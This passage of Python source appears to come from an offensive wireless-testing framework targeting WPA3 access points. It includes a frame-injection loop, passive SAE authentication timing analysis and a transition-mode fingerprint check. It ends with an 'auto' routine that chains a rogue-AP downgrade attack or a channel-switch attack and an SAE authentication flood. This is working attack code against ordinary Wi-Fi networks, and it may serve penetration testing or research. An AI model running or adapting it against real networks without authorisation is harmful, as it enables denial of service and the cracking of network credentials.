            while end_t is None or time.time() < end_t:
                sendp(pkt, iface=iface, inter=0.02, count=10, verbose=0)
        except KeyboardInterrupt:
            print_status("double_ssid stopped.")

    def _run_timing(self) -> None:
        """Passive timing stats on SAE auth frames (wpa3_sec-style lab signal)."""
        if not self._require_bssid():
            return
        scapy = self._scapy()
        if not scapy:
            return
        from scapy.all import Dot11, Dot11Auth, sniff  # type: ignore

        iface = str(self.interface)
        ap = str(self.target_bssid).lower()
        _set_monitor_channel(iface, int(self.target_channel))

        times: list[float] = []
        last_by_src: dict[str, float] = {}

        def _handle(p: Any) -> None:
            if not p.haslayer(Dot11Auth):
                return
            auth = p[Dot11Auth]
            if getattr(auth, "algo", None) != 3:
                return
            hdr = p[Dot11]
            if hdr.addr1 and hdr.addr1.lower() != ap and hdr.addr3 and hdr.addr3.lower() != ap:
                return
            now = time.time()
            src = (hdr.addr2 or "").lower()
            seq = int(getattr(auth, "seqnum", 0))
            if src and seq == 2 and src in last_by_src:
                times.append(now - last_by_src[src])
            if src:
                last_by_src[src] = now

        dur = self._duration_seconds()
        if dur <= 0:
            dur = 30
        if self.dry_run:
            print_status(f"[dry_run] Would sniff SAE frames for {dur}s on {iface}")
            return

        print_status(f"Sniffing SAE auth timing for {dur}s (target AP {ap})…")
        sniff(iface=iface, prn=_handle, store=False, timeout=dur)
        if not times:
            print_info("No SAE confirm pairs observed; extend duration or trigger associations.")
            return
        avg = sum(times) / len(times)
        var = sum((t - avg) ** 2 for t in times) / max(1, len(times))
        print_success(f"Samples={len(times)} mean_delta={avg:.4f}s std≈{var ** 0.5:.4f}s")
        print_info("Low variance may warrant deeper analysis (see wireless-research/wpa3_sec).")

    def _sniff_transition_quick(self, seconds: int = 12) -> bool:
        """Return True if beacons from target BSSID advertise SAE+PSK and optional MFP."""
        scapy = self._scapy()
        if not scapy:
            return False
        from scapy.all import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeResp, sniff  # type: ignore

        ap = self._bssid_str()
        found: dict[str, bool] = {"ok": False}

        def _proc(p: Any) -> None:
            if found["ok"]:
                return
            if not p.haslayer(Dot11):
                return
            if p[Dot11].addr3 and p[Dot11].addr3.lower() != ap:
                return
            if not (p.haslayer(Dot11Beacon) or p.haslayer(Dot11ProbeResp)):
                return
            elt = p.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 48 and elt.info:
                    auths, mfp = _parse_rsn_akms_mfp(bytes(elt.info))
                    if _is_transition_fingerprint(auths, mfp):
                        found["ok"] = True
                        return
                elt = elt.payload.getlayer(Dot11Elt)

        sniff(iface=str(self.interface), prn=_proc, store=False, timeout=seconds)
        return found["ok"]

    def _run_auto(self) -> None:
        """Heuristic: transition fingerprint -> downgrade; else CSA then Scapy SAE flood."""
        if not self._require_bssid():
            return
        if self.dry_run:
            print_status("[dry_run] auto: probe transition, then branch")
            return

        print_status("auto: probing WPA3 transition fingerprint…")
        probe_s = min(15, max(5, int(self.duration) // 4 or 8))
        if self._sniff_transition_quick(probe_s):
            print_info("Transition / mixed AKM detected — running downgrade branch if rogue is set.")
            if str(self.rogue_interface).strip() and str(self.rogue_wpa_passphrase).strip():
                self._run_downgrade()
                return
            print_error("Set rogue_interface + rogue_wpa_passphrase for downgrade; falling back to CSA + flood.")

        total = int(self.duration)
        if total <= 0:
            csa_part, flood_part = 30, 30
        else:
            csa_part = max(5, total // 2)
            flood_part = max(5, total - csa_part)
        self._run_csa(duration_override=csa_part)
        self._run_sae_flood(duration_override=flood_part)
